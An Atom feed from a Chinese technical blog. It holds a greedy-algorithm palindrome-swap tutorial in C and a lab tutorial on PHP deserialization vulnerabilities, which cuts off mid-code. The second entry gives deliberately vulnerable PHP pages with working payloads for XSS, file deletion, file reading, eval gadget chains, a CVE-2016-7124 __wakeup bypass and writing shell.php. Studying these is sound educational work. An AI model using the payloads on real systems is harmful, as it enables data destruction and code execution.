<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>soliym</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://soliym.top/"/>
  <updated>2019-03-30T07:03:58.902Z</updated>
  <id>http://soliym.top/</id>
  
  <author>
    <name>soliym</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>贪心算法</title>
    <link href="http://soliym.top/2021/06/19/%E8%B4%AA%E5%BF%83%E7%AE%97%E6%B3%95/"/>
    <id>http://soliym.top/2021/06/19/贪心算法/</id>
    <published>2021-06-19T14:37:21.315Z</published>
    <updated>2019-03-30T07:03:58.902Z</updated>
    
    <content type="html"><![CDATA[<h3 id="贪心算法概述："><a href="#贪心算法概述：" class="headerlink" title="贪心算法概述："></a>贪心算法概述：</h3><p>贪心算法（贪婪）又叫登山法，它的根本思想为：逐步求解最优解，将问题分解为每个小部分，使每个部分都达到最优解，从而使全局达到最优。贪心算法求解问题得到的解不一定是最优的解。例如Prim算法和Kruskal算法都是使用贪心算法的策略。</p><p>注意：有些问题用贪心算法可以达到最优解，但是不是所有问题都是局部最优从而全局最优，面对最优解问题时除了贪心算法以外还有动态规划。</p><a id="more"></a><h4 id="完美的代价"><a href="#完美的代价" class="headerlink" title="完美的代价"></a>完美的代价</h4><h5 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h5><p>　　回文串，是一种特殊的字符串，它从左往右读和从右往左读是一样的。小龙龙认为回文串才是完美的。现在给你一个串，它不一定是回文的，请你计算最少的交换次数使得该串变成一个完美的回文串。<br>　　交换的定义是：交换两个相邻的字符<br>　　例如mamad<br>　　第一次交换 ad : mamda<br>　　第二次交换 md : madma<br>　　第三次交换 ma : madam (回文！完美！)</p><p>输入格式</p><p>　　第一行是一个整数N，表示接下来的字符串的长度(N &lt;= 8000)<br>　　第二行是一个字符串，长度为N.只包含小写字母</p><p>输出格式</p><p>　　如果可能，输出最少的交换次数。<br>　　否则输出Impossible</p><p>样例输入</p><p>5<br>mamad</p><p>样例输出</p><p>3</p><h5 id="问题分析"><a href="#问题分析" class="headerlink" title="问题分析"></a>问题分析</h5><p>​       在输入的字符串中不匹配的字母可能是一个或零，所以可以先找出这个字母，创建一个包含26个空间是数组，分别表示字符串中字母的个数，然后遍历这个数组，如果字母的个数为奇数，则表示该字母为不匹配字母。首先从首字母开始，找到与它匹配的字符，再将它与最后一个字母交换，这样一对匹配的字母就交换完了，如果遇到不匹配的字母，则将它与中间的字母交换，然后在开始遍历。但是问题要求的是相邻的交换，所以这种方法不符合要求。</p><p>​        我们需要相邻交换，所以要找到交换的起点和终点。求解方法和上面类似，先从首字母开始，在从与字符串的另一方向开始，遍历找到与首字母匹配的字母，记录它的位置，从该位置起，将后一个字母向前一个位置移动，直到与最后，记录交换次数，再将首字母元素赋值给最后一个元素，这样一趟交换完成。</p><p>全局循环次数：1 to n/2;      </p><p>每次循环需判断是否为不匹配元素</p><p>匹配元素循环次数：n-i-1 to j(当字母为匹配字母时)</p><p>匹配元素移动次数：j to n-i-1</p><p>不匹配元素循环次数：i to j(当字母为匹配字母时)</p><p>不匹配元素移动次数：j to i</p><h5 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> count=<span class="number">0</span>;<span class="comment">//交换次数 </span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">hunwen</span><span class="params">(<span class="keyword">char</span> x,<span class="keyword">int</span> y,<span class="keyword">char</span> *z)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i,j,k;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;y/<span class="number">2</span>;i++) &#123;</span><br><span class="line"> <span class="keyword">if</span>(z[i]!=x)&#123;<span class="comment">//匹配字母情况 </span></span><br><span class="line"> j=y-i<span class="number">-1</span>;</span><br><span class="line"> <span class="keyword">while</span>(j!=i&amp;&amp;(z[j]!=z[i]))j--;</span><br><span class="line"> <span class="keyword">for</span>(k=j;k&lt;y-i<span class="number">-1</span>;k++)</span><br><span class="line">   &#123; z[k]=z[k+<span class="number">1</span>];</span><br><span class="line">        count++;</span><br><span class="line">  &#125;</span><br><span class="line"> z[k]=z[i];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;<span class="comment">//不匹配字母情况 </span></span><br><span class="line">    j=i;</span><br><span class="line">    <span class="keyword">while</span>(j!=y-i<span class="number">-1</span>&amp;&amp;(z[j]!=z[y-i<span class="number">-1</span>]))</span><br><span class="line">    j++;</span><br><span class="line">    <span class="keyword">for</span>(k=j;k&gt;i;k--) &#123;</span><br><span class="line">     z[k]=z[k<span class="number">-1</span>];</span><br><span class="line">     count++;  &#125;</span><br><span class="line">         z[k]=z[y-i<span class="number">-1</span>];</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="keyword">int</span> i,j=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> w;<span class="comment">//记录不匹配字符 </span></span><br><span class="line"><span class="keyword">int</span> b[<span class="number">26</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">char</span> a[<span class="number">801</span>];</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</span><br><span class="line">getchar();<span class="comment">//清除缓存 </span></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line"> <span class="built_in">scanf</span>(<span class="string">"%c"</span>,&amp;a[i]);</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line"> b[a[i]<span class="number">-97</span>]++; <span class="comment">//对字母个数计数 </span></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">26</span>;i++)</span><br><span class="line"> &#123;</span><br><span class="line"> <span class="keyword">if</span>(b[i]%<span class="number">2</span>!=<span class="number">0</span>)</span><br><span class="line">  &#123; w=i+<span class="number">97</span>; j++; &#125;<span class="comment">//遍历找到不匹配字母 </span></span><br><span class="line"> &#125; </span><br><span class="line"> <span class="keyword">if</span>(j&gt;=<span class="number">2</span>)<span class="built_in">printf</span>(<span class="string">"impossible"</span>);</span><br><span class="line"> <span class="keyword">else</span> &#123;</span><br><span class="line"> hunwen(w,n,a);<span class="comment">//交换函数 </span></span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">"%d"</span>,count);&#125; </span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>每一次循环都使字符串两边的字母匹配，达到局部最优的方案，贪心算法没有固定的算法模式，只有固定的算法思想：局部最优，从而全局最优。</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;贪心算法概述：&quot;&gt;&lt;a href=&quot;#贪心算法概述：&quot; class=&quot;headerlink&quot; title=&quot;贪心算法概述：&quot;&gt;&lt;/a&gt;贪心算法概述：&lt;/h3&gt;&lt;p&gt;贪心算法（贪婪）又叫登山法，它的根本思想为：逐步求解最优解，将问题分解为每个小部分，使每个部分都达到最优解，从而使全局达到最优。贪心算法求解问题得到的解不一定是最优的解。例如Prim算法和Kruskal算法都是使用贪心算法的策略。&lt;/p&gt;
&lt;p&gt;注意：有些问题用贪心算法可以达到最优解，但是不是所有问题都是局部最优从而全局最优，面对最优解问题时除了贪心算法以外还有动态规划。&lt;/p&gt;
    
    </summary>
    
      <category term="算法" scheme="http://soliym.top/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="贪心" scheme="http://soliym.top/tags/%E8%B4%AA%E5%BF%83/"/>
    
  </entry>
  
  <entry>
    <title>反序列化原理与实例讲解</title>
    <link href="http://soliym.top/2021/06/19/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E4%BE%8B%E8%AE%B2%E8%A7%A3/"/>
    <id>http://soliym.top/2021/06/19/反序列化原理与实例讲解/</id>
    <published>2021-06-19T14:37:21.304Z</published>
    <updated>2020-05-18T08:12:03.268Z</updated>
    
    <content type="html"><![CDATA[<h5 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h5><p>序列化：把变量转换为课存储或课传输文本结构的过程</p><p>反序列化：在合适的时候把序列化后的文本结构转化为原来的变量</p><p>将变量对象持久化操作，让其离开内存保存在硬盘中，等到需要的时候，在从硬盘中加载变量对象到内存中，这样就可以大大节约内存地址</p><p>意义：序列化和反序列的结合可以轻松的存储和传输数据，我们可以把对象序列化为不同的格式，json、XML、二进制、SOAP等</p><a id="more"></a><h5 id="使用序列化"><a href="#使用序列化" class="headerlink" title="使用序列化"></a>使用序列化</h5><p>1、将内存中的类写入文件或者数据库中</p><p>2、递归保存对象引用的每一个对象数据</p><p>3、分布式对象</p><p>4、同一对文件、对象、数据保存和传输</p><h5 id="PHP的序列化和反序列化"><a href="#PHP的序列化和反序列化" class="headerlink" title="PHP的序列化和反序列化"></a>PHP的序列化和反序列化</h5><p>PHP在序列化的函数为Serialize，将对象转换为字符串保存对象中的变量及变量值</p><p>php序列化一个对象会保存类型，对象的所有变量及值，但是不会保存方法</p><p>PHP的反序列化函数为unseralize，将序列化后的字符串转换为对象</p><h5 id="PHP的魔法函数"><a href="#PHP的魔法函数" class="headerlink" title="PHP的魔法函数"></a>PHP的魔法函数</h5><p>__construct() //当⼀个对象创建时被调⽤ </p><p>__destruct() //当对象被销毁是触发 </p><p>__wakeup() //使⽤unserialize触发 </p><p>__sleep() //使⽤serialize触发 </p><p>__toString() //把类当做字符串使⽤时触发 </p><p>__call() //在对象上下⽂中调⽤不可访问的⽅法时触发 </p><p>__callStatic //在静态上下⽂中调⽤不可访问的⽅法时触发 </p><p>__get() //⽤于从不可访问的属性读取数据 </p><p>__set() //⽤于将数据写⼊不可访问的属性 </p><p>__isset() //在不可访问的属性上调⽤isset()或者empty()触发 </p><p>__unset() //在不可访问的属性上使⽤unset()是触发 </p><p>__invoke() //当脚本尝试将对象⽤为函数时触发</p><p>由于序列化中不会传递方法，对象中的自定义函数我们没有办法直接利用，但是魔法函数是可以自动执行的，当类中调用了魔法函数时，魔法函数又自动触发执行的特点</p><h5 id="反序列化漏洞实验"><a href="#反序列化漏洞实验" class="headerlink" title="反序列化漏洞实验"></a>反序列化漏洞实验</h5><p>PHP反序列化漏洞，是在我们使⽤ unserialize() 进⾏反序列化的时候，如果反序列化对象中存在⼀ </p><p>些我们可以利⽤的魔法函数且传⼊的变量可控，那么就可能触发这个魔法函数，来执⾏我们想要的过 </p><p>程。</p><h6 id="实验一："><a href="#实验一：" class="headerlink" title="实验一："></a>实验一：</h6><p>搭建PHP页面</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">class dome </span><br><span class="line">&#123; </span><br><span class="line">public $a=&apos;dome&apos;; </span><br><span class="line">function __destruct() </span><br><span class="line">&#123; </span><br><span class="line">echo $this-&gt;a; </span><br><span class="line">echo &apos;&lt;/br&gt;&apos;; </span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line">$ob= new dome(); </span><br><span class="line">echo serialize($ob).&apos;&lt;/br&gt;&apos;; </span><br><span class="line">$test= $_GET[&apos;id&apos;] ; </span><br><span class="line">unserialize($test); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>通过浏览器访问该页面</p><p>在url中构造注入参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.31.9/demo.php?id=O:4:%22dome%22:1:&#123;s:1:%22a%22;s:4:%221234%22;&#125;</span><br></pre></td></tr></table></figure><p>结果：页面会显示我们输入的参数“1234”</p><p>但是有一个问题是？为什么输出的顺序的1234在前呢</p><p>当代码被执行的时候是从上往下的，首先会从类的创建开始，类被创建完毕后，会输出序列化后的对象，这就是第一行的输出，然后test从页面接受名为id的参数，然后反序列化为一个对象，我们注入的是一个名为dome的类，并且变量a的值为1234。__destruct魔法函数，是在对象被销毁时，触发的，什么时候对象会被销毁呢？当然是页面执行完毕的时候，所以反序列化函数先被销毁，所以先输出了1234，然后ob对象再被销毁</p><p>序列化参数解析：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;dome&quot;:1:&#123;s:1:&quot;a&quot;;s:4:&quot;dome&quot;;&#125;</span><br></pre></td></tr></table></figure><p>上述是PHP序列化后输出的内容，它的内容构造如下：</p><p>O：表示object</p><p>4：表示类名的长度</p><p>“dome”：表示类名</p><p>1：表示类下有几个参数</p><p>花括号内表示变量名及参数</p><p>s：表示string</p><p>1：表示变量名长度</p><p>​     “a”：表示变量名</p><p>实验的另一种玩法：注入xss漏洞</p><p>因为我们输入的东西会显示在页面上，所以我们可以注入xss</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.31.9/demo.php?id=O:4:%22dome%22:1:&#123;s:1:%22a%22;s:25:%22%3Cscript%3Ealert(1)%3C/script%3E%22;&#125;</span><br></pre></td></tr></table></figure><h6 id="实验二："><a href="#实验二：" class="headerlink" title="实验二："></a>实验二：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">class delete </span><br><span class="line">&#123; </span><br><span class="line">public $filename = &apos;error&apos;; </span><br><span class="line">function __destruct() </span><br><span class="line">&#123; </span><br><span class="line">echo $this-&gt;filename.&quot; was deleted.&lt;/br&gt;&quot;; </span><br><span class="line">//uplink函数是删除⽂件，dirname函数输出路径； </span><br><span class="line">unlink(dirname(__FILE__).&apos;/&apos;.$this-&gt;filename); </span><br><span class="line">&#125; &#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这段代码中有魔法函数，但是没有反序列化函数，也没有注入点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">include &apos;2.php&apos;; </span><br><span class="line">class student </span><br><span class="line">&#123; </span><br><span class="line">public $name=&apos;&apos;; </span><br><span class="line">public $age=&apos;&apos;; </span><br><span class="line">public function information() </span><br><span class="line">&#123; </span><br><span class="line">echo &apos;student: &apos;.$this-&gt;name.&apos; is &apos;.$this-&gt;age.&apos;years old.&lt;/br&gt;&apos;; </span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line">$zs=unserialize($_GET[&apos;id&apos;]); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这段代码中没有魔法函数，但是有反序列化函数，也有注入点</p><p>因为3.php中有包括2.php，所以我们就可以看成一个代码程序，这样2就有注入点和反序列化函数了</p><p>创建2和3的php页面，然后再创建一个a.txt文件</p><p>通过浏览器访问3.php，然后构造payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> </span><br><span class="line">O:6:&quot;delete&quot;:1:&#123;s:8:&quot;filename&quot;;s:5:&quot;a.txt&quot;;&#125;</span><br></pre></td></tr></table></figure><p>执行后，会在页面显示a.txt被删除，然后在根目录下查看文件是否存在，如果没有，那么反序列化漏洞就执行成功</p><p>总结：通过上述实验，可以得到反序列化漏洞的条件</p><p>1、魔法函数</p><p>2、反序列化函数</p><p>3、web注入点</p><h6 id="实验三："><a href="#实验三：" class="headerlink" title="实验三："></a>实验三：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">class read </span><br><span class="line">&#123; </span><br><span class="line">public $filename = &apos;error&apos; ;</span><br><span class="line">function __toString() </span><br><span class="line">&#123; </span><br><span class="line">//file_get_contents()函数是把⽂件内容赋予⼀个变量 </span><br><span class="line">return file_get_contents($this-&gt;filename); </span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>该页面中，没有反序列化函数，没有注入点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">//5.php </span><br><span class="line">&lt;?php </span><br><span class="line">include &apos;4.php&apos;; </span><br><span class="line">class student </span><br><span class="line">&#123; </span><br><span class="line">public $name=&apos;&apos;; </span><br><span class="line">public $age=&apos;&apos;; </span><br><span class="line">public function information() </span><br><span class="line">&#123; </span><br><span class="line">echo &apos;student: &apos;.$this-&gt;name.&apos; is &apos;.$this-&gt;age.&apos;years old.&lt;/br&gt;&apos;; </span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line">$zs=unserialize($_GET[&apos;id&apos;]); </span><br><span class="line">echo $zs; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>该页面中有反序列化函数，有注入点</p><p>与上一个实验相似，这个也是两个页面结合的，但是使用的魔法函数不同,操作方法一样</p><p>创建这两个页面，然后再创建一个a.txt文件，在这个文件中写入一些数据</p><p>构造payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.31.9/5.php?id=O:4:%22read%22:1:&#123;s:8:%22filename%22;s:5:%22a.txt%22;&#125;</span><br></pre></td></tr></table></figure><p>页面就会显示a.txt的数据了，它的原理和方法与上一实验是一样的，要注意的是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo $zs;</span><br></pre></td></tr></table></figure><p>这行代码是触发的关键，__tostring魔法函数是当做字符串时，触发的，echo输出的就是字符串，所以会被触发</p><h6 id="实验四："><a href="#实验四：" class="headerlink" title="实验四："></a>实验四：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">class a&#123; </span><br><span class="line">public $varr; </span><br><span class="line">function __destruct()&#123; </span><br><span class="line">$this-&gt;varr-&gt;evaltest(); </span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line">class b&#123; </span><br><span class="line">public $str; </span><br><span class="line">function evaltest()&#123; </span><br><span class="line">eval($this-&gt;str); //危险函数 </span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line">$obj= new a(); </span><br><span class="line">unserialize($_GET[&apos;id&apos;]); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>这段代码中魔法函数，反序列化，注入点都有，但是在魔法函数中，有一段代码很有问题</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;varr-&gt;evaltest();</span><br></pre></td></tr></table></figure><p>这段代码调用了b中的evaltest函数，一般来说这样是不可以的，如果要调用，必须是varr是一个类b的对象，如果我们要触发这个函数，就要将varr构造为b的对象</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;a&quot;:1:&#123;s:4:&quot;varr&quot;;s:1:&quot;1&quot;;&#125;</span><br></pre></td></tr></table></figure><p>这是一般的构造，但是varr的值不再是一个字符串，而是一个对象，所以要将对象加入到payload中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;a&quot;:1:&#123;s:4:&quot;varr&quot;;O:1:&quot;b&quot;:1:&#123;s:3:&quot;str&quot;;s:10:&quot;phpinfo();&quot;;&#125;;&#125;</span><br></pre></td></tr></table></figure><p>在原有的payload的基础上，将varr的变量值替换为一个b的对象</p><p>反序列化后：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">class a&#123; </span><br><span class="line">public $varr= &apos;new b()&apos;; </span><br><span class="line">&#125; </span><br><span class="line">class b&#123; </span><br><span class="line">public $str=&apos;phpinfo();&apos;; </span><br><span class="line">&#125; </span><br><span class="line">$x = new a();</span><br></pre></td></tr></table></figure><h6 id="实验五："><a href="#实验五：" class="headerlink" title="实验五："></a>实验五：</h6><p>wakeup() 魔法函数 </p><p>在unserialize()执⾏时会检测是否存在wakeup()⽅法，如果存在会先调⽤wakeup()⽅法作为预先准 </p><p>备对象需要的资源，经常⽤于执⾏⼀些初始化操作，或者重新建⽴数据库连接等场景。 </p><p>CVE-2016-7124 漏洞 php5&lt;5.6.25;php7&lt;7.0.10中出现，该漏洞会在序列化字符串时，对象的属 </p><p>性个数的值⼤于真实的属性个数值时会跳过wakeup()⽅执⾏。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> class wakeup_bug&#123;</span><br><span class="line"> public $a=&apos;wakeup&apos;;</span><br><span class="line"> function __destruct()&#123;</span><br><span class="line"> echo &apos;I am not &apos;.$this-&gt;a;</span><br><span class="line"> &#125;</span><br><span class="line"> function __wakeup()&#123;</span><br><span class="line"> echo &apos;I am &apos;.$this-&gt;a；</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">unserialize($_GET[&apos;id&apos;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>构造payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.31.9/7.php?id=O:10:%22wakeup_bug%22:1:&#123;s:1:%22a%22;s:3:%22123%22;&#125;</span><br></pre></td></tr></table></figure><p>结果：</p><p><strong>destruct()和</strong>wakeup()函数都会执行</p><p>构造payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.31.9/7.php?id=O:10:%22wakeup_bug%22:2:&#123;s:1:%22a%22;s:3:%22123%22;&#125;</span><br></pre></td></tr></table></figure><p>如果属性的参数是两个时，就会跳过__wakeup函数</p><h6 id="实验六："><a href="#实验六：" class="headerlink" title="实验六："></a>实验六：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">class a&#123; </span><br><span class="line">var $a = &quot;test&quot;; </span><br><span class="line">function __destruct()&#123; </span><br><span class="line">$fp = fopen(&quot;shell.php&quot;,&quot;w+&quot;); </span><br><span class="line">fputs($fp,$this-&gt;a); </span><br><span class="line">fclose($fp); </span><br><span class="line">&#125; </span><br><span class="line">function __wakeup() </span><br><span class="line">&#123; </span><br><span class="line">//清空$a的值 </span><br><span class="line">foreach(get_object_vars($this) as $b =&gt; $c) &#123; </span><br><span class="line">$this-&gt;$b = null; </span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line">unserialize($_GET[&apos;id&apos;]); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>代码分析：</p><p>魔法函数<strong>destruct()会将变量a的值保存到shell.php文件，</strong>wakeup函数会将变量a的值清空，因为wakeup函数是先与destruct函数执行的，所以我们输入的所有内容都是无效的，因此我们要绕过wakeup函数，绕过方法前面已经演示了</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:1:&quot;a&quot;:2:&#123;s:1:&quot;a&quot;;s:3:&quot;123&quot;;&#125;</span><br></pre></td></tr></table></figure><p>在根目录下查看结果，会有一个shell.php存放我们输入的数据</p><h6 id="实验七："><a href="#实验七：" class="headerlink" title="实验七："></a>实验七：</h6><p>private、protected属性外部修改 </p><p>public属性可以被外部修改⽽private、protected属性⽆法被对象外部修改</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">class student </span><br><span class="line">&#123; </span><br><span class="line">public $name=&apos;xxx&apos;; </span><br><span class="line">private $age=&apos;xxx&apos;; </span><br><span class="line">protected $sex=&apos;xxx&apos;; </span><br><span class="line">function __toString() </span><br><span class="line">&#123; </span><br><span class="line">return &apos;name: &apos;.$this-&gt;name.&apos;&lt;br&gt;age: &apos;.$this-&gt;age&apos;&lt;/br&gt;sex: &apos;.$this- </span><br><span class="line">&gt;sex&apos;&apos;; </span><br><span class="line">&#125; </span><br><span class="line">&#125; </span><br><span class="line">$s1 = new student(); </span><br><span class="line">echo $s1.&apos;&lt;/br&gt;&apos;; </span><br><span class="line">echo serialize($s1); </span><br><span class="line">$zs=unserialize($_GET[&apos;id&apos;]); </span><br><span class="line">echo $zs; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>private 属性序列化格式为 <0x00>对象名<0x00>属性名 </0x00></0x00></p><p>public 属性没有变化 </p><p>protected 属性序列化格式为<0x00>*<0x00>属性名 </0x00></0x00></p><p>需要从外部改变属性值需要把<0x00>替换为%00 %00算作⼀个字符</0x00></p><p>构造payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 